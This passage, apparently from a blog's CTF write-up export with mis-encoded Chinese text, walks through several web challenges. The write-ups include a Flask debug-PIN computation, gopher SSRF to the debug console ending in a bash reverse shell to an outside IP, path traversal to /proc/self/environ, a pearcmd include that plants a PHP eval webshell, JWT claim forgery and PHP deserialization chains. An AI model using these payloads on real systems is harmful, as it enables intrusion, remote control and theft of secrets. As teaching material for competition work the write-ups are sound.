ä½†æ˜¯åŒæ—¶æˆ‘ä»¬è¿˜å¾—æœ‰åœ°æ–¹å»è°ƒç”¨è¿™ä¸ªwelcomeå‡½æ•°æ‰è¡Œ\n\nä»”ç»†è§‚å¯Ÿå®ƒçš„debugæ˜¯å¼€å¯çš„ å¹¶ä¸”æˆ‘ä»¬è¿˜å¯ä»¥è¯»æ–‡ä»¶ é‚£ä¹ˆä¸€çœ¼å°±çŸ¥é“æ˜¯è¦å»ç®—pinç ç„¶årceäº† å‰é¢çš„å†…å®¹åªæ˜¯å™±å¤´\n\nè®¡ç®—pinç \n\n```javascript\nimport hashlib\nfrom itertools import chain\n\nprobably_public_bits = [\n    'root'  # /etc/passwd\n    'flask.app',  # é»˜è®¤å€¼\n    'Flask',  # é»˜è®¤å€¼\n    '/usr/local/lib/python3.10/dist-packages/flask/app.py'  # æŠ¥é”™å¾—åˆ°\n]\n\nprivate_bits = [\n    '112581235869047',  # /sys/class/net/eth0/address åè¿›åˆ¶\n    '8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope'\n    #8cab9c97-85be-4fb4-9d17-29335d7b2b8a\n    #docker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope\n    # å­—ç¬¦ä¸²åˆå¹¶ï¼š1./etc/machine-id(dockerä¸ç”¨çœ‹) /proc/sys/kernel/random/boot_idï¼Œæœ‰boot-idé‚£å°±æ‹¼æ¥boot-id 2. /proc/self/cgroup\n]\n\n\n# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\n\ncookie_name = '__wzd' + h.hexdigest()[:20]\n\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\n\nrv = None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                            for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n\nprint(rv)\n```\n\nè¿™é‡Œå…³äº`/proc/self/cgroup`è¿™é‡Œçš„å†…å®¹å’Œæˆ‘ä»¬ä¸€èˆ¬åšé¢˜æ—¶è·å–çš„ä¸å¤ªä¸€æ · ä¸è¿‡è®°ä½ä¸€ç‚¹å°±è¡Œäº†\n\n`å–ç¬¬ä¸€è¡Œçš„æœ€åä¸€ä¸ªæ–œæ /åé¢çš„æ‰€æœ‰å­—ç¬¦ä¸²`é‚£ä¹ˆè‚¯å®šæ˜¯å¯¹çš„\n\nè®¡ç®—å¾—pinç  `397-838-235`\n\næ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯ è¦é€šè¿‡gopheråè®®å»è®¿é—®å†…ç½‘ä¸­`/console`è·¯ç”±å¹¶ä¸”è¿›è¡ŒRCE\n\nä½†æ˜¯ç”±äºdebugmodeçš„rceéœ€è¦æºå¸¦cookie æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å»è®¡ç®—cookie\n\nå› ä¸º`/console`æ˜¯åœ¨å†…ç½‘çš„1314ç«¯å£ä¸­ æ‰€ä»¥æˆ‘ä»¬æ²¡æ³•ç›´æ¥é€šè¿‡æµè§ˆå™¨è¿›å…¥debugçš„æ§åˆ¶å°\n\nè¿™é‡Œå°±éœ€è¦æ‰‹ç®—cookieäº†\n\næ–¹æ³•å‚è€ƒï¼š[flask-pin](https://unk.icu/2023/06/19/flask-pin/)  ç¥ï¼[SCTF2023 Web WriteUp - Boogiepop Doesnâ€™t Laugh](https://boogipop.com/2023/06/20/SCTF2023 Web WriteUp/)\n\nå‘é€éªŒè¯pinç çš„è¯·æ±‚\n\n```\nGET /?__debugger__=yes&cmd=pinauth&pin=397-838-235&s=hCYJBiBvCDHEJqflrGtk\n```\n\néœ€è¦æ‹¿åˆ°s ç›´æ¥è®¿é—®/console å¯ä»¥åœ¨æºä»£ç ä¸­æ‹¿åˆ°\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483592278-60ae86c4-b0cb-4206-8cf7-23eae59b1225.png)\n\nç„¶åè®°å¾—ç¼–ç æ‰“å…¥`?url=http://127.0.0.1:1314/console?__debugger__=yes&cmd=pinauth&pin=397-838-235&s=hCYJBiBvCDHEJqflrGtk&lolita[]=1` éªŒè¯pinç è®¡ç®—æ­£ç¡®çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483692006-fad9b10a-ab71-43e3-b358-5586d7458a08.png)\n\nç„¶åæˆ‘ä»¬è¦è¿›è¡Œrceè¿˜éœ€è¦æºå¸¦cookie\n\n### ç¬¬ä¸€ç§æ–¹å¼ è„šæœ¬è®¡ç®—\n\néœ€è¦è®¡ç®—cookie è¿™é‡Œç›´æ¥ç”¨åˆ°ä¸€ä¸ªç°æˆçš„è„šæœ¬ï¼š[GitHub - WiIs0n/Flask-cookie-generation-based-on-PIN-code: This script generates a Cookie based on a legitimate PIN code.](https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code)\n\nåŒæ—¶å¯ä»¥è®¡ç®—å‡ºpinå’Œcookie\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698484036732-b9d7526a-ee26-4ba4-be46-a4cf5797e8c0.png)\n\n### ç¬¬äºŒç§æ–¹å¼gopherå‘åŒ…\n\nåˆ©ç”¨gopheråè®®å‘åŒ… é€šè¿‡è¿”å›åŒ…è·å–åˆ°cookie\n\nè„šæœ¬å¦‚ä¸‹\n\n```javascript\nimport urllib\nimport urllib.parse\nimport urllib.request\n\ndef PAYLOAD(s,cmd,host,pin):\n\n    poc = f\"\"\"GET /console?&__debugger__=yes&pin={pin}&cmd={cmd}&frm=0&s={s} HTTP/1.1\nHost: {host}\nConnection: close\n\"\"\"\n    \n    new_poc = urllib.parse.quote(poc).replace('%0A','%0D%0A')\n    res = f'gopher://{host}/_' + new_poc\n    print(res)\n    return urllib.parse.quote(res)\n\n\ncmd = \"pinauth\"\ns= \"hCYJBiBvCDHEJqflrGtk\"\nhost=\"127.0.0.1:1314\"\n#cookie = \"__wzdaa31f34934bb24e966f6=1698068595|d4af8efd2a4d\"\npin = \"397-838-235\"\n\na = PAYLOAD(s,cmd,host,pin)\nprint(a)\n```\n\nå¯è§æˆ‘ä»¬é€šè¿‡è„šæœ¬è®¡ç®—å‡ºæ¥çš„ cookieä¹Ÿæ˜¯æ­£ç¡®çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485116132-4b195cc5-160e-4156-be43-10df30b6fe65.png)\n\n\n\nè®¡ç®—å‡ºcookieä¹‹åå°±ä¸ç”¨æºå¸¦pinäº† æºå¸¦cookieç›´æ¥rceå³å¯\n\nç›´æ¥åå¼¹shell è®°å¾—urlç¼–ç ä¸€ä¸‹\n\n```javascript\nimport urllib\nimport urllib.parse\nimport urllib.request\n\ndef PAYLOAD(s,cmd,host,cookie):\n\n    poc = f\"\"\"GET /console?&__debugger__=yes&cmd={cmd}&frm=0&s={s} HTTP/1.1\nHost: {host}\nConnection: close\nCookie: {cookie}\n\"\"\"\n    \n    new_poc = urllib.parse.quote(poc).replace('%0A','%0D%0A')\n    res = f'gopher://{host}/_' + new_poc\n    print(res)\n    return urllib.parse.quote(res)\n\n\ncmd = '__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.130.34.53%2F7777%20%3C%261%5C%22%22)'\ns= \"hCYJBiBvCDHEJqflrGtk\"\nhost=\"127.0.0.1:1314\"\ncookie = \"__wzd41acf1cefa50cf0ead64=1698485090|9b48530259cc\"\npin = \"397-838-235\"\n\na = PAYLOAD(s,cmd,host,cookie)\nprint(a)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485894959-0305c6d9-dc23-41b2-987e-74979132cf72.png)\n\næˆåŠŸï¼ï¼ï¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485737899-0a1ec05c-caea-4355-b599-bc7798a61086.png)\n\n## NextDrive\n\næœ€æŠ˜ç£¨å‡ºé¢˜äººçš„ä¸€é›†\n\nè¶£å‘³é¢˜ç›®\n\nä¸€ä¸ªæ¨¡æ‹Ÿç™¾åº¦ç½‘ç›˜çš„é¢˜ç›®\n\né¦–å…ˆç”³è¯·ä¸€ä¸ªè´¦å·ç„¶åç™»å½•\n\næ ¹æ®æç¤º\n\nHint2: ä½ çŸ¥é“ç§’ä¼ çš„åŸç†å—ï¼Ÿ\n\né‚£ä¹ˆé¦–å…ˆäº†è§£ä¸€ä¸‹ç§’ä¼ çš„åŸç†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698486990058-e84113fd-3c61-496c-84d6-f1b3a796fc9d.png)\n\nåœ¨å…¬å…±èµ„æºåŒºèƒ½æ‰¾åˆ°test.res.httpæ–‡ä»¶\n\n```javascript\nHTTP/1.1 200 OK\ncontent-type: application/json; charset=utf-8\ncontent-length: 50\ndate: Tue, 06 Oct 2023 13:39:21 GMT\nconnection: keep-alive\nkeep-alive: timeout=5\n\n{\"code\":0,\"msg\":\"success\",\"logged\":true,\"data\":[{\"name\":\"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac\",\"hash\":\"5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc\",\"size\":27471829,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486253740,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ã™ãšã‚ feat.åæ˜ - RADWIMPS,åæ˜.flac\"},{\"name\":\"Windows 12 Concept.png\",\"hash\":\"469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900\",\"size\":440707,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256209,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"Windows 12 Concept.png\"},{\"name\":\"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf\",\"hash\":\"03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f\",\"size\":330767,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256242,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ä¿¡æ¯å®‰å…¨æŠ€æœ¯ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç±»åˆ†çº§æŒ‡å—.pdf\"},{\"name\":\"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg\",\"hash\":\"2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e\",\"size\":32920,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486256280,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"ä¸é™é€Ÿï¼Œå°±æ˜¯å¿«ï¼.jpg\"},{\"name\":\"test.req.http\",\"hash\":\"09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486259714,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}]}\n```\n\nå¯ä»¥çœ‹åˆ°æ˜¯å‘åŒ…æ•°æ®åŒ… \n\næ³¨æ„åˆ°è¿˜æœ‰ä¸€ä¸ªtest.req.httpä¸Šä¼ äº†ä½†æ˜¯æ–‡ä»¶æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥\n\n```javascript\n{\"name\":\"test.req.http\",\"hash\":\"09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182\",\"size\":1085,\"uploader\":\"admin\",\"uploader_uid\":\"100000\",\"shareTime\":1698486259714,\"isYours\":true,\"isOwn\":true,\"ownFn\":\"test.req.http\"}\n```\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç§’ä¼ çš„åŸç†éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ ä¸‹è½½æ—¶æ›¿æ¢test.req.httpçš„å“ˆå¸Œå€¼ é‚£ä¹ˆå°±å¯ä»¥å°†test.req.httpæ–‡ä»¶ä¸‹è½½ä¸‹æ¥äº†\n\nå¾—åˆ°\n\n```javascript\nPOST /api/info/drive/sharezone HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 0\nContent-Type: application/x-www-form-urlencoded\nCookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiI5ODRkMTIyMDQ5YmExNTM2MmYzNTEyZWYyNmE5YzUyMGY2NzBiYzNjYjJiMzhiODRhZWU0NzAzNDAwMzg2MWM3In0uCQ9dVhxMfi1WChcEdxJoYQ.TA1XZ2MKFgcQRRRmW18PDEAJUmBgDURXEUFFMAwJWloQXVIybl9BUkFBFTVbC1YOQgxWZmVcFldHQRZnWgMLUkJdVmZnW0lUTBNPMFsOVwlGClY2YlZCVEFARjVRCwtTQ11Wb2ZcSVJCE09iWlgIXUxcUDQyXBUHRkBPY1gDWF8\nHost: localhost:21920\nOrigin: http://localhost:21920\nPragma: no-cache\nReferer: http://localhost:21920/sharezone\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0\nsec-ch-ua: \"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\n```\n\né‚£ä¹ˆæˆ‘ä»¬å°±æ‹¿åˆ°äº†adminçš„tokenäº† ç„¶åæ›¿æ¢tokenä¼ªé€ èº«ä»½\n\nåˆå¤šäº†ç‚¹æ–‡ä»¶ ä¸è¿‡é‡è¦çš„æ˜¯share.js\n\n```javascript\nconst Router = require(\"koa-router\");\nconst router = new Router();\nconst CONFIG = require(\"../../runtime.config.json\");\nconst Res = require(\"../../components/utils/response\");\nconst FileSignUtil = require(\"../../components/utils/file-signature\");\nconst { DriveUtil } = require(\"../../components/utils/database.utilities\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\nconst { verifySession } = require(\"../../components/utils/session\");\nconst logger = global.logger;\n\n/**\n * @deprecated\n * ! FIXME: å‘ç°æ¼æ´ï¼Œè¯·è¿›è¡Œä¿®æ”¹\n */\nrouter.get(\"/s/:hashfn\", async (ctx, next) => {\n    const hash_fn = String(ctx.params.hashfn || '')\n    const hash = hash_fn.slice(0, 64)\n    const from_uid = ctx.query.from_uid\n    const custom_fn = ctx.query.fn\n\n    // å‚æ•°æ ¡éªŒ\n    if (typeof hash_fn !== \"string\" || typeof from_uid !== \"string\") {\n        // invalid params or query\n        ctx.set(\"X-Error-Reason\", \"Invalid Params\");\n        ctx.status = 400; // Bad Request\n        return ctx.res.end();\n    }\n\n    // æ˜¯å¦ä¸ºå…±äº«çš„æ–‡ä»¶\n    let IS_FILE_EXIST = await DriveUtil.isShareFileExist(hash, from_uid)\n    if (!IS_FILE_EXIST) {\n        ctx.set(\"X-Error-Reason\", \"File Not Found\");\n        ctx.status = 404; // Not Found\n        return ctx.res.end();\n    }\n\n    // ç³»ç»Ÿä¸­æ˜¯å¦å­˜å‚¨æœ‰è¯¥æ–‡ä»¶\n    \n  \n    if (!IS_FILE_EXIST_IN_STORAGE) {\n        logger.error(`File ${hash_fn.yellow} not found in storage, but exist in database!`)\n        ctx.set(\"X-Error-Reason\", \"Internal Server Error\");\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    }\n\n    // æ–‡ä»¶åå¤„ç†\n    let filename = typeof custom_fn === \"string\" ? custom_fn : (await DriveUtil.getFilename(from_uid, hash));\n    filename = filename.replace(/[\\\\\\/\\:\\*\\\"\\'\\<\\>\\|\\?\\x00-\\x1F\\x7F]/gi, \"_\")\n\n    // å‘é€\n    ctx.set(\"Content-Disposition\", `attachment; filename*=UTF-8''${encodeURIComponent(filename)}`);\n    // ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))\n    await ctx.sendFile(path.resolve(CONFIG.storage_path, hash_fn)).catch(e => {\n        logger.error(`Error while sending file ${hash_fn.yellow}`)\n        logger.error(e)\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    })\n})\n\nmodule.exports = router;\n```\n\nè¿™é‡Œå°±ç¨ç¨å¯„äº† ç”±äºjsé¢˜ç›®åšçš„å°‘ çœ‹jsä»£ç é€»è¾‘å¾ˆåƒåŠ› æœ€åè¿˜æ˜¯æŠ˜ç£¨å‡ºé¢˜å¸ˆå‚…å‡ºçš„qwq\n\nhash_fnæ˜¯æ•´ä¸ªæ–‡ä»¶çš„hash\n\nhashå–äº†hash_fnå‰64ä¸ªå­—ç¬¦æ ¡éªŒæ˜¯å¦æ˜¯åˆ†äº«çš„æ–‡ä»¶ å¦‚æœæ˜¯åˆ™ä¼šå°†æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥\n\nä½†æ˜¯é—®é¢˜å‡ºåœ¨äº†\n\n```javascript\nlet IS_FILE_EXIST_IN_STORAGE\n    try {\n        IS_FILE_EXIST_IN_STORAGE = fs.existsSync(path.resolve(\n            , hash_fn))\n    } catch (e) {\n        ctx.set(\"X-Error-Reason\", \"Internal Server Error\");\n        ctx.status = 500; // Internal Server Error\n        return ctx.res.end();\n    }\n```\n\nå®ƒæ ¡éªŒæ—¶æ˜¯å¦ä¸ºåˆ†äº«æ–‡ä»¶å–çš„æ˜¯hash ä½†æ˜¯è¯»æ–‡ä»¶æ˜¯é€šè¿‡hash_fn\n\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©å‰64ä¸ªhashå€¼ä¸ºä»»æ„åˆ†äº«çš„æ–‡ä»¶hashå€¼ ä¹‹åçš„å†…å®¹ä¸º`../../../../../proc/self/environ` å°±å¯ä»¥å°†å†…å®¹è¯»å‡ºæ¥\n\npayloadï¼š`/s/ä»»æ„åˆ†äº«æ–‡ä»¶çš„hashå€¼/../../../../../proc/self/environ?from_uid=100000&fn=/proc/self/environ` è®°å¾—è¦urlç¼–ç  ä¸ç„¶ä¼šæ··æ·†å¯¼è‡´é‡å®šå‘åˆ°ä¸»é¡µ/(ã„’oã„’)/~~\n\n\n\n## 4-å¤ç›˜(æœªè§£å‡º)\n\nåŸæ¥è¿™ä¸ªé¢˜è€ƒpearcmdå•ŠğŸ¤” è·Ÿç€å®˜æ–¹wpå­¦ä¹ \n\nindex.phpå…³é”®ä»£ç \n\n```javascript\n  <?php \n        if (isset($_GET['page'])) {\n          $page ='pages/' .$_GET['page'].'.php';\n\n        }else{\n          $page = 'pages/dashboard.php';\n        }\n        if (file_exists($page)) {\n          require_once $page; \n        }else{\n          require_once 'pages/error_page.php';\n        }\n ?>\n```\n\nå­˜åœ¨æ–‡ä»¶åŒ…å« ç„¶åå°±ç›´æ¥payloadğŸ¤”ğŸ¤”\n\n```\n/index.php?+config-create+/&page=/../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[x])?>+/var/www/html/1.php\n```\n\nä¹‹åæ˜¯ä¸€ä¸ªsuidææƒ gzipçš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698838298382-580e4d6d-f28d-40e7-a0e4-00f6420608e6.png)\n\nğŸ¤”ğŸ¤”  \n\n## Ye's Pickleï¼ˆæœªè§£å‡º)\n\næ‰¾åˆ°åŸé¢˜äº† ä¸æ•¢å®è·µã€‚ã€‚ã€‚rz åŸé¢˜æ˜¯ç¥¥äº‘æ¯2022 çš„FunWEB\n\nè€ƒç‚¹ï¼š\n\n- jwtä¼ªé€ \n- pickleååºåˆ—åŒ–\n\næºç :\n\n```javascript\n# -*- coding: utf-8 -*-\nimport base64\nimport string\nimport random\nfrom flask import *\nimport jwcrypto.jwk as jwk\nimport pickle\nfrom python_jwt import *\napp = Flask(__name__)\n\ndef generate_random_string(length=16):\n    characters = string.ascii_letters + string.digits  # åŒ…å«å­—æ¯å’Œæ•°å­—\n    random_string = ''.join(random.choice(characters) for _ in range(length))\n    return random_string\napp.config['SECRET_KEY'] = generate_random_string(16)\nkey = jwk.JWK.generate(kty='RSA', size=2048)\n@app.route(\"/\")\ndef index():\n    payload=request.args.get(\"token\")\n    if payload:\n        token=verify_jwt(payload, key, ['PS256'])\n        session[\"role\"]=token[1]['role']\n        return render_template('index.html')\n    else:\n        session[\"role\"]=\"guest\"\n        user={\"username\":\"boogipop\",\"role\":\"guest\"}\n        jwt = generate_jwt(user, key, 'PS256', timedelta(minutes=60))\n        return render_template('index.html',token=jwt)\n\n@app.route(\"/pickle\")\ndef unser():\n    if session[\"role\"]==\"admin\":\n        pickle.loads(base64.b64decode(request.args.get(\"pickle\")))\n        return render_template(\"index.html\")\n    else:\n        return render_template(\"index.html\")\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000, debug=True)\n```\n\nç®€å•å®¡è®¡ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„roleä¸ºadminæ—¶ æˆ‘ä»¬æ‰èƒ½è¿›è¡Œpickleååºåˆ—åŒ–åˆ©ç”¨\n\né¢˜ä¸­é‰´æƒæ˜¯é jwtæ¥å®ç°çš„ é‚£ä¹ˆç”Ÿæˆè¿‡ç¨‹æ˜¯ \n\nå¦‚æœgetè·å–åˆ°token é‚£ä¹ˆjwtä¸­`session[\"role\"]`å°±ä¸ºæˆ‘ä»¬è¾“å…¥tokençš„role \n\nå¦‚æœtokenä¸ºç©º é‚£ä¹ˆä»–ä¼šå¸®æˆ‘è‡ªåŠ¨ç”Ÿæˆjwt å¹¶ä¸”å°†`session[\"role\"]`åˆå§‹åŒ–ä¸ºguest\n\nç„¶åæ˜¯jwt crackçš„ä¸€ä¸ªæ–°å‡ºçš„æ¼æ´ è¿™é‡ŒjwtåŠ å¯†æ˜¯é rsaåŠ å¯† \n\nåˆ©ç”¨è¿™ä¸ªè„šæœ¬ å¯ä»¥ä¸éœ€è¦å…¬ç§é’¥å°±å¯ä»¥ä¼ªé€ jwt\n\né¡¹ç›®åœ°å€ï¼š\n\nhttps://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9\n\nç®€å•ä¿®æ”¹ä¸€ä¸‹ æŠŠé‡Œé¢æ”¹ä¸º`parsed_payload['role'] = 'admin'` å³å¯\n\n```javascript\n\"\"\" Test claim forgery vulnerability fix \"\"\"\nfrom datetime import timedelta\nfrom json import loads, dumps\n#from test.common import generated_keys\n#from test import python_jwt as jwt\nfrom pyvows import Vows, expect\nfrom jwcrypto.common import base64url_decode, base64url_encode\ndef topic(topic):\n    \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\"\n    [header, payload, signature] = topic.split('.')\n    parsed_payload = loads(base64url_decode(payload))\n    parsed_payload['role'] = 'admin'\n    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))\n    return '{\"  ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}'\ntoken='eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTg3NzA4MzAsImlhdCI6MTY5ODc2NzIzMCwianRpIjoiaVNzT2pQOVlLZ1NOUHVqYU5wYWkyQSIsIm5iZiI6MTY5ODc2NzIzMCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.WxTnJPgzKgjBYQ8HB8Ny5W4ZLNpsjAKsikMXHhtIQ-e5MiJp8jSt7AwKcuGsrqsFlTYeJLuGyLaxGGC29PAsKS8SVM82BG0W79nK35mp4aLXIEjer-cRT4GO8LX-WVZ0rRJZuv2Pe8ETPi8Rz0UahtmPYm7BbuvQ3XOudkb--wdcUrSIm2354RvaISRA7Z4a8VuP77VgkBIFNoebO_3c2wTO_w79-hTqg-JbUJqagqeFj5ptroo1SiYHpy2u2zUPKNqEeC6kcKwkZQWNUBGY4BuceLuoGBs9x2DWkAAsgrMC9PcUJ-8zzNFaZF22KxGgiLBv2pjR7HneVrF0Utx4gA'\npayload = topic(token)\nprint(payload)\n```\n\nä¹‹åå°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„pickleååºåˆ—åŒ–äº† ä¸å†èµ˜è¿°\n\n# ç»“å°¾\n\nä¸€èµ·å…±å‹‰\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698564198569-1243af25-92dd-4cfc-916d-4750a52577a3.png)\n","categories":["å„èµ›äº‹WP"]},{"title":"SHCTF-æ ¡å¤–èµ›é“ WEB WP","url":"/post/cb61c260.html","content":"\næŸ¥ç¼ºè¡¥æ¼\n\n<!--more-->\n\n# WEEK1\n\n## babyRCE\n\n```\nuniq${IFS}/f???\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696227692048-d68dc7db-8da9-467e-9a56-f3144d51b8f7.png)\n\n## ç™»å½•å°±ç»™flag\n\nå¼±å£ä»¤ admin/password\n\n\n\n## é£æœºå¤§æˆ˜\n\nunicodeè§£ç å†base64è§£ç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218779041-17e60cf7-8b84-4bb6-82ae-dc2b64c2bb78.png)\n\n## ez_serialize\n\nè€ƒç‚¹:\n\n- nginxæ—¥å¿—åŒ…å«\n- phpååºåˆ—åŒ–\n\n```java\n<?php\n\nclass A{\n    public $var_1;\n    \n    public function __invoke(){\n    include($this->var_1);\n    }\n}\n\nclass B{\n    public $q;\n    public function __wakeup()\n{\n    if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->q)) {\n                echo \"hacker\";           \n            }\n    }\n\n}\nclass C{\n    public $var;\n    public $z;\n        public function __toString(){\n            return $this->z->var;\n        }\n}\n\nclass D{\n    public $p;\n        public function __get($key){\n            $function = $this->p;\n            return $function();\n        }  \n}\n$a = new B();\n$a->q = new C();\n$a->q->z = new D();\n$a->q->z->p=new A();\n$a->q->z->p->var_1=\"/var/log/nginx/access.log\";\necho urlencode(serialize($a));\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225164008-8562808d-7eb0-4178-b5b2-6e09d2dc76b1.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696225179418-22c57d4a-2956-461f-8744-ad60f52f7576.png)\n\n## ezphp\n\nè€ƒç‚¹:\n\nhttps://xz.aliyun.com/t/2557\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1696218682919-6637ec2f-8393-4e58-9eb3-a260ef466c8d.png)\n\n## 1zzphp\n\nè€ƒç‚¹:\n\n- æ­£åˆ™å›æº¯\n\n```java\nimport requests\npayload = {\n    \"c_ode\":'a'*1000000+\"2023SHCTF\"\n}\nr = requests.post(url='http://112.6.51.212:32212/?num[]=1',data=payload)\nprint(r.text)\n```\n\n## ç”Ÿæˆä½ çš„é‚€è¯·å‡½æŠŠ~\n\né¢˜ç›®ä¸€å¼€å§‹æ²¡æè¿°æ¸…æ¥š ä¹Ÿæœ‰äººåšå‡ºæ¥ã€‚ã€‚ æŒºæŠ½è±¡çš„\n\næˆ‘è¿˜ä»¥ä¸ºæ˜¯CRLF å‚»é€¼\n\n```java\nPOST /generate_invitation HTTP/1.1\nHost: 112.6.51.212:31589\nContent-Length: 119\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nOrigin: http://112.6.51.212:31589\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://112.6.51.212:31589/generate_invitation\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n{  \n    \"name\": \"Z1d10t\",  \n    \"imgurl\": \"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&spec=640&img_type=jpg\"  \n} \n```\n\n# WEEK2\n\n## serialize\n\nè€ƒç‚¹ï¼š\n\n- ååºåˆ—åŒ–\n- å¼•ç”¨è¿ç®—ç¬¦\n- arrayç»•è¿‡æ­£åˆ™\n- phpå‘½åè§„èŒƒ\n\n```java\n<?php\nhighlight_file(__FILE__);\nclass misca{\n    public $gao;\n    public $fei;\n    public $a;\n    public function __get($key){\n        $this->miaomiao();\n        $this->gao=$this->fei;\n        die($this->a);\n    }\n    public function miaomiao(){\n        $this->a='Mikey Mouse~';\n    }\n}\nclass musca{\n    public $ding;\n    public 